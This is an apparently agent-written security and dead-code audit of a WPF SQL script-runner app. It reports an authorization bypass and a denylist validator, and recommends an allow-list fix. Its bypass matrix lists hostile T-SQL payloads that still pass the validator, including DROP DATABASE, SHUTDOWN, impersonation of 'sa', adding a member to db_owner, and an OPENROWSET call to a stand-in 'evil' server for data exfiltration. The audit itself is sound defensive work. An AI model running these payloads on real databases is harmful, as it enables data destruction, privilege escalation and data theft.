# Refactor-Cleaner Sweep — Refreshed (2026-11-13)

**Repository:** `C:\Users\User\source\repos\KabarakScriptRunnerApp`
**Baseline:** `b727c8d` + 5 uncommitted files (`+15 / −5`)
**Mode:** Read-only. No source files were modified.
**Verification:** Re-checked every prior finding against the working tree. `dotnet build` and `dotnet test` executed; validator checked against 78 payloads via a throwaway harness outside the repo.

---

## 1. Executive summary

| Status | Count |
|--------|-------|
| Release blockers remaining | **2** |
| Prior blockers fixed | **2** |
| High findings remaining | **3** (1 partial) |
| Medium findings remaining | 10 |
| Confirmed dead code | 3 classes, 6 members, 1 duplicate wiring, 2 brushes, 10 packages |

**Still blocking deployment:**

1. **RB-01 — authorization bypass.** `GetScriptsAsync(departmentId, isAdmin)` still ignores both parameters (`ScriptRepository.cs:88-104`). Every authenticated user sees every active script from every department, while the UI appears filtered (`MainWindow.xaml.cs:110-112`).
2. **RB-02 — validator is still a denylist.** The patch added six overrides but left 34+ statement forms executable, including `DROP DATABASE`, `DBCC`, `SHUTDOWN`, `BULK INSERT`, `OPENROWSET`, `CREATE TRIGGER`, `DENY`, and `EXECUTE AS` (`ScriptValidator.cs:51-85`). The error message at line 42 still overstates coverage.

**Fixed since the last sweep:** password reset (`RB-03`), user activate/deactivate (`RB-04`), and the Lato font (`H-03`).

**Build/test:** App builds with 10 `NU1701` warnings, 0 errors. Tests: 15 passed, 0 failed. The `.slnx` cannot be built with `dotnet` because the SSDT `Database` project imports a Visual Studio-only target (`MSB4278`).

---

## 2. Delta table

| Prior ID | Prior severity | Current status | Evidence |
|----------|----------------|----------------|----------|
| RB-01 authorization filter | Critical | **OPEN** | `ScriptRepository.cs:88-104`; SQL at `:99` is still `WHERE s.IsActive = 1` |
| RB-02 validator denylist | Critical | **PARTIAL** | 6 overrides at `ScriptValidator.cs:77-85`; denylist retained; 34+ types pass |
| RB-03 password reset cast | Critical | **FIXED** | `ChangePasswordWindow.xaml.cs:43` uses `UserSummary`; validator tuple updated |
| RB-04 user toggle cast | Critical | **FIXED** | `UsersWindow.xaml.cs:73` uses `UserSummary` |
| H-01 in-process scheduling | High | **OPEN** | `BatchExportWindow.xaml.cs:215-233` still only `Task.Delay` |
| H-02 stale lockout counter | High | **OPEN** | `ScriptRepository.cs:172-190`; caller-supplied count at `LoginWindow.xaml.cs:84` |
| H-03 Lato font | High | **FIXED** | `PdfReportService.cs:51,100` now use `Arial` |
| H-04 reflection log binding | High | **PARTIAL** | Reflection still at `AccessLogWindow.xaml.cs:79-83,243-244`; dead `as User` cast at `:239` |
| M-01 `AppTitle` unused | Medium | OPEN | `OptionsWindow.xaml.cs:26,54` only |
| M-02 `ICurrentUserService` unread | Medium | OPEN | Registered/populated in `App.xaml.cs:150-175`; never read |
| M-03 empty `catch {}` | Medium | OPEN | `MainWindow.xaml.cs:246,554,561,592`; `BatchExportWindow.xaml.cs:337` |
| M-04 fire-and-forget audit | Medium | OPEN | `MainWindow.xaml.cs:284,589` |
| M-05 debug `Task.Delay(5000)` | Medium | OPEN | `MainWindow.xaml.cs:496` |
| M-06 `TotalScripts = ActiveScripts` | Medium | OPEN | `DashboardWindow.xaml.cs:76` |
| M-07 parallel DTOs | Medium | OPEN | `DashboardRepository.cs:235+` vs `PdfReportService.cs:409-429` |
| M-08 duplicated retry | Medium | OPEN | `ScriptRepository.cs:546-574`, `DashboardRepository.cs:215-229`, `ScriptExecutorService.cs:33-43` |
| M-10 static service locator | Medium | OPEN | `App.xaml.cs:18-19` |
| L-01 provider sniffing | Low | OPEN | `App.xaml.cs:26-36` |
| L-02 batch export bypasses department | Low | OPEN | `BatchExportWindow.xaml.cs:50` |
| L-03 `null` → `0` FK | Low | **INVALID** | `AssignScriptsWindow.xaml.cs:74` converts `0` back to `null`; schema allows NULL |
| L-04 swallowed validation reason | Low | OPEN | `ScriptRunValidator.cs:38` |

---

## 3. RB-02 — validator bypass matrix

The patch added overrides for `TruncateTableStatement`, `AlterTableStatement`, `CreateProcedureStatement`, `GrantStatement`, `BackupStatement`, and `RestoreStatement`. It remains a type-by-type denylist over ScriptDom's ~200 statement classes.

### Blocked (verified)
`INSERT`, `UPDATE`, `DELETE`, `MERGE`, `CREATE TABLE`, `DROP TABLE`, `TRUNCATE TABLE`, `ALTER TABLE`, `CREATE PROCEDURE`, `GRANT`, `BACKUP`, `RESTORE`, `EXEC`/`EXECUTE`, `EXEC sp_executesql`, `EXEC xp_cmdshell`, `SELECT ... INTO`, `INSERT ... EXEC`.

### Still passes (verified)
| Category | Example payload |
|----------|-----------------|
| Server/database control | `DROP DATABASE Kabarak` |
| | `ALTER DATABASE Kabarak SET READ_ONLY` |
| | `CREATE DATABASE Evil` |
| | `USE master` |
| | `SHUTDOWN` |
| | `KILL 51` |
| | `RECONFIGURE` |
| | `CHECKPOINT` |
| | `DBCC CHECKDB`, `DBCC FREEPROCCACHE` |
| | `WAITFOR DELAY '00:00:10'` |
| | `SET IDENTITY_INSERT uni.Students ON` |
| | `BULK INSERT uni.Students FROM 'C:\temp\x.csv'` |
| DDL not covered | `CREATE VIEW / FUNCTION / TRIGGER / SCHEMA / SYNONYM / TYPE / INDEX` |
| | `ALTER VIEW / PROCEDURE / FUNCTION / LOGIN / INDEX / SCHEMA` |
| | `DROP VIEW / PROCEDURE / FUNCTION / TRIGGER / SCHEMA / INDEX / SYNONYM` |
| | `CREATE USER` / `CREATE LOGIN ... WITH PASSWORD=...` / `DROP LOGIN` |
| | `ALTER ROLE db_owner ADD MEMBER evil` |
| DCL | `DENY SELECT ON uni.Students TO public` |
| | `REVOKE SELECT ON uni.Students FROM public` |
| Execution context | `EXECUTE AS USER='evil'` / `EXECUTE AS LOGIN='sa'` / `REVERT` |
| Data exfiltration | `SELECT * FROM OPENROWSET('SQLNCLI','Server=evil;...','SELECT 1')` |
| | `SELECT * FROM OPENQUERY(LinkedSrv,'SELECT 1')` |
| | `SELECT * FROM OPENROWSET(BULK 'C:\temp\x.csv', SINGLE_CLOB)` |

Nested traversal itself works: `SELECT 1; DROP TABLE ...` and `IF ... BEGIN DELETE ... END` are blocked because the visitor walks child nodes. The gap is **type coverage**, not nesting.

**Patch defect:** `ScriptValidator.cs:82` says `// Block DBCC, BACKUP, RESTORE`, but only `BackupStatement` and `RestoreStatement` have overrides. `DBCC` still passes.

**Why it matters:** `ScriptExecutorService.cs:26` re-validates and is the only gate before `ExecuteReaderAsync` at `:59`. With `Integrated Security=True` (`appsettings.json:3`), the script runs under the interactive Windows user's SQL permissions — often `sysadmin` on a DBA/developer machine.

**Minimal sound fix:** allow-list every top-level statement as `SelectStatement` (plus explicitly approved `DECLARE`/`SET` if needed), reject `Into != null`, reject `OpenRowsetTableReference` / `OpenQueryTableReference` / `BulkOpenRowset` anywhere in the tree, rewrite the error message, and add one negative test per statement family. Add defence in depth: a `db_datareader` login with `DENY EXECUTE` or a read-only replica.

**Product decision required:** the current denylist already rejects `CREATE TABLE #t` and `SELECT ... INTO #t`. If legitimate report scripts stage into temp tables, the allow-list must accommodate that explicitly.

---

## 4. Patch hygiene (new)

| ID | Location | Issue |
|----|----------|-------|
| N-01 | `ScriptValidator.cs:82-83` | Misleading comment says DBCC is blocked; no override exists. |
| N-02 | `UsersWindow.xaml.cs:72` | `// FIXED: Changed 'User' to 'UserSummary'` left in shipped code. |
| N-03 | `AccessLogWindow.xaml.cs:30,239` | Comment claims a `UserSummary` fix; rows are anonymous objects. The `as User` cast is always null and immediately overwritten by reflection. |
| N-04 | `ScriptExecutorService.cs:26,47,59` | Validator is the only barrier; no read-only intent or least-privilege login. |
| N-05 | `App.xaml.cs:44`; `KabarakScriptRunnerApp.csproj:37-39` | Hardcoded Sentry DSN; placeholder org/project slugs cause a skipped-upload warning every build. |

---

## 5. Dead code — confirmed

### Whole files
| File | Evidence |
|------|----------|
| `Core\Services\RetryPolicyFactory.cs` | Only a `<see cref>` in `DatabaseContext.cs:26`; no callers |
| `Core\Services\PdfExportService.cs` | Zero call sites; duplicates `PdfReportService` |
| `App\Services\ErrorHandler.cs` | Zero call sites |

### Members
| File:Line | Member |
|-----------|--------|
| `ScriptRepository.cs:137,154,201` | `GetScriptVersionsAsync`, `GetScriptVersionAsync`, `RestoreScriptVersionAsync` (unfinished feature — confirm roadmap) |
| `DatabaseContext.cs:29` | `ConnectionString` property (only the private field is used) |
| `ToastService.cs:10-13` + `App.xaml.cs:89` | `Initialize()` + call (empty shim) |
| `ScriptEditorWindow.xaml.cs:76-86` + `.xaml:73` | no-op `txtSqlText_ScrollChanged` |
| `ScriptEditorWindow.xaml.cs:20` or `.xaml:72` | duplicate `TextChanged` wiring (runs twice per keystroke) |
| `Themes\Colors.xaml:8,19` | `Color.Warning` + `Brush.Warning` (only reference each other) |

### Packages
| Project | Package | Note |
|---------|---------|------|
| App | `Notification.Wpf` 11.0.0 | No code reference |
| App | `ToastNotifications` / `.Messages` 2.5.1 | No code reference; source of 4 NU1701 warnings |
| App | `Serilog.Extensions.Logging` 10.0.0 | No `AddSerilog`/`UseSerilog` |
| App | `Serilog.Sinks.Console` 6.1.1 | Only Debug + File sinks configured |
| App | `BCrypt.Net-Next` 4.2.0 | Direct reference unused (Core/PasswordTool hash) |
| Core/Data/Database | `System.Security.Cryptography.Pkcs` 9.0.21 | No `SignedCms`/`EnvelopedCms` usage |
| Data | `BCrypt.Net-Next` 4.2.0 | Only Core hashes |
| Database | `Microsoft.Data.SqlClient` 6.1.5 | SQL-only project; no C# consumer |
| Data | `Microsoft.Extensions.Configuration.Json` 9.0.0 | **Do not delete blind** — `DatabaseContext.cs:3,11-13` uses `IConfiguration`/`GetConnectionString`. Swap to `Microsoft.Extensions.Configuration.Abstractions`, do not simply remove. |

---

## 6. Recommended PR batches

**Batch 0 — Baseline**
```powershell
dotnet build KabarakScriptRunnerApp\KabarakScriptRunnerApp.csproj -c Release
dotnet test  tests\KabarakScriptRunner.Tests\KabarakScriptRunner.Tests.csproj -c Release
```
Do not build the `.slnx` with `dotnet`; the SSDT project fails with `MSB4278`. Use Visual Studio or build App/Tests explicitly.

**Batch 1 — Security (must ship)**
1. RB-01 authorization filter + non-admin regression test.
2. RB-02 allow-list validator + per-family negative tests.
3. Document least-privilege SQL login / read-only intent.

**Batch 2 — Patch hygiene**
Remove `// FIXED:` comment; fix the DBCC comment; delete the dead `as User` cast and stale comment; rewrite the validator error message.

**Batch 3 — Zero-risk dead files**
Delete `RetryPolicyFactory.cs`, `PdfExportService.cs`, `ErrorHandler.cs`; remove `DatabaseContext.ConnectionString` + stale `<see cref>`. Build + test.

**Batch 4 — Dead members / duplication**
Remove versioning methods after roadmap confirmation; remove `ToastService.Initialize` + call; remove no-op scroll handler and duplicate `TextChanged`; remove warning brushes; consolidate retry helpers and DTOs.

**Batch 5 — Packages**
Prune the unused references above; swap the Data configuration package. This clears 4 NU1701 warnings. Restore + build + test.

**Batch 6 — Traps**
H-01 scheduling, H-02 atomic lockout, H-04 typed `AccessLogRow`, M-01/M-02/M-03/M-04/M-05/M-06/M-10, N-05 Sentry config.

---

## 7. Build / test evidence

| Command | Result |
|---------|--------|
| `dotnet build KabarakScriptRunnerApp\KabarakScriptRunnerApp.csproj -c Release` | **Succeeded** — 10 warnings (`NU1701`), 0 errors |
| `dotnet test tests\KabarakScriptRunner.Tests\... -c Release` | **Passed** — 15/15, 0 failed |
| `dotnet build KabarakScriptRunnerApp.slnx` | **Fails** — `MSB4278` from SSDT import in `KabarakScriptRunner.Database.csproj:43-44` |

`NU1701` packages: `OpenTK 3.3.1`, `OpenTK.GLWpfControl 3.3.0`, `SkiaSharp.Views.WPF 3.119.0`, `ToastNotifications 2.5.1`, `ToastNotifications.Messages 2.5.1`.

---

## 8. Needs verification / limitations

- **Versioning methods** — `ScriptVersions` table and archive trigger exist (`10_ScriptVersioning.sql`); likely an unfinished feature, not dead code. Confirm roadmap.
- **`PdfExportService` / `RetryPolicyFactory`** — `public static`; confirm no out-of-repo consumer.
- **`ICurrentUserService`** — deliberately registered/populated; confirm whether an authorization layer is planned.
- **`AppTitle`** — product intent.
- **Batch "Run At"** — advertised feature or experimental?
- **Sentry DSN** — whether Sentry is intended in production.
- Static analysis + validator harness only. The app was not launched, no database/installer/SSDT command was run.
- WPF resource keys, Dapper mapping, DI, and reflection can hide references; those are listed above.
- Test coverage is thin: 15 tests, none for repository authorization, lockout concurrency, or the new validator overrides.
